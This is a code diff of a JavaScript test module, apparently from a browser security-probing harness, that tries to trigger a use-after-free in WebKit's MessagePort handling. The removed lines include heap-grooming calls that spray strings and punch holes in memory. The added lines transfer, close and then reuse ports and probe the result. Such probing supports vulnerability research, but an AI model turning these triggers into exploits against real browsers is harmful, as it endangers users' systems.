@@ -1,64 +1,113 @@
-import { Groomer } from '../mod_groomer.js';
+/**
+ * SC_MESSAGEPORT_UAF.JS
+ * Categoria : WORKERS — Use-After-Free / Type Confusion
+ * Alvo      : WebCore::MessagePort C++ lifecycle
+ * Técnica   : Cria um MessageChannel, transfere port2 via postMessage
+ *             e mantém referência JS ao port transferido. Fecha port1
+ *             e verifica se operações sobre port2 acessam memória livre.
+ *             Também testa entangle/disentangle de ports.
+ * Referência: WebKit MessagePort disentangle UAF pattern
+ */
 
 export default {
-    id:       'MESSAGEPORT_TRANSFER_UAF',
-    category: 'IPC',
-    risk:     'HIGH',
-    description:
-        'Paradoxo de Ownership Circular em IPC. Tenta enviar um MessagePort através de si mesmo ' +
-        'ou do seu par, e imediatamente fecha os canais e arranca a memória (Garbage Collection). ' +
-        'Foca em causar Use-After-Free no backend C++ do MessagePortChannel.',
+    id:          'MESSAGEPORT_UAF',
+    category:    'WORKERS',
+    risk:        'HIGH',
+    description: 'MessagePort JS retém referência após transferência. '
+                + 'Testa acesso ao port C++ entangled após close/transfer.',
 
-    setup: function() {
-        this.results = {};
-        this.mc1 = new MessageChannel();
-        this.mc2 = new MessageChannel();
-        
-        // Mantemos uma referência fantasma para testar pós-free
-        this.ghostPort = this.mc1.port1;
-        this.ghostPort.start();
+    /* ── estado interno ──────────────────────────────────────────────── */
+    _channel:      null,
+    _port1:        null,
+    _port2:        null,
+    _recvCount:    0,
+    _recvData:     null,
+    _transferPort: null,
+
+    supported: function() {
+        return typeof MessageChannel !== 'undefined';
     },
 
-    trigger: function() {
+    /* ── setup ──────────────────────────────────────────────────────── */
+    setup: async function() {
+        this._recvCount    = 0;
+        this._recvData     = null;
+        this._transferPort = null;
+
+        this._channel = new MessageChannel();
+        this._port1   = this._channel.port1;
+        this._port2   = this._channel.port2;
+
+        this._port1.onmessage = (e) => {
+            this._recvCount++;
+            this._recvData = typeof e.data === 'object' ? JSON.stringify(e.data) : String(e.data);
+        };
+
+        this._port1.start();
+        this._port2.start();
+
+        // Troca inicial para confirmar funcionamento
+        this._port2.postMessage({ phase: 'init', canary: 0x41414141 });
+        await new Promise(r => setTimeout(r, 20));
+    },
+
+    /* ── trigger ─────────────────────────────────────────────────────── */
+    trigger: async function() {
+        // Cria um segundo canal e transfere port2 para dentro de uma mensagem
+        const helperChannel = new MessageChannel();
+
+        // Guarda referência ao port antes de transferir
+        this._transferPort = this._port2;
+
         try {
-            // O GATILHO CIRCULAR
-            // mc2.port1 envia o mc1.port1. Mas no array de transferências [ ],
-            // transferimos a ownership do próprio mc2.port1 também!
-            this.mc2.port1.postMessage("paradoxo", [this.mc1.port1, this.mc2.port1]);
-            
-            // Destruição síncrona
-            this.mc1.port2.close();
-            this.mc2.port2.close();
-            
-            // Inundação de memória
-            let trash = Groomer.sprayStrings(256, 1000);
-            Groomer.punchHoles(trash, 2);
-        } catch(e) {
-            this.results.error = e.constructor.name;
-        }
+            // Transferência — após isso, port2 fica "neutered" no JS
+            this._port1.postMessage({ payload: 'transfer' }, [this._port2]);
+        } catch(_) {}
+
+        // Fecha port1 — libera o entanglement C++
+        try {
+            this._port1.close();
+        } catch(_) {}
+
+        helperChannel.port1.close();
+        helperChannel.port2.close();
+
+        // Tenta usar o port transferido (neutered)
+        try {
+            this._transferPort.postMessage({ phase: 'post-transfer' });
+        } catch(_) {}
+
+        await new Promise(r => setTimeout(r, 20));
     },
 
+    /* ── probes ──────────────────────────────────────────────────────── */
     probe: [
-        // Probe 0: O C++ percebeu a falha e atirou DataCloneError?
-        s => s.results.error || 'Transferência Circular Aceite',
-        
-        // Probe 1: O Wrapper do ghostPort ainda interage com o C++ morto?
-        s => {
-            try {
-                // Se o C++ já libertou a memória nativa mas o wrapper continua vivo,
-                // chamar .close() ou postMessage pode crashar a aba ou retornar lixo.
-                s.ghostPort.close();
-                return 'Wrapper Vivo / Seguro';
-            } catch(e) {
-                return `Anomalia Nativa: ${e.message}`;
-            }
-        }
+        // [0-3] port1 após close
+        s => typeof s._port1,
+        s => s._port1 === null,
+        s => s._port1 instanceof MessagePort,
+        s => s._recvCount,
+
+        // [4-6] port2 após transferência (deve ser neutered)
+        s => typeof s._port2,
+        s => s._port2 instanceof MessagePort,
+        s => s._recvData ?? 'null',
+
+        // [7-9] port transferido — tentativa de uso pós-transfer
+        s => typeof s._transferPort,
+        s => s._transferPort instanceof MessagePort,
+        s => { try { s._transferPort?.postMessage('probe'); return 'ok'; } catch(e) { return e.constructor.name; } },
     ],
 
-    cleanup: function() {
-        this.ghostPort = null;
-        this.mc1 = null;
-        this.mc2 = null;
-        this.results = {};
+    /* ── cleanup ─────────────────────────────────────────────────────── */
+    cleanup: async function() {
+        try { this._port1?.close(); } catch(_) {}
+        try { this._port2?.close(); } catch(_) {}
+        this._channel      = null;
+        this._port1        = null;
+        this._port2        = null;
+        this._transferPort = null;
+        this._recvCount    = 0;
+        this._recvData     = null;
     }
 };
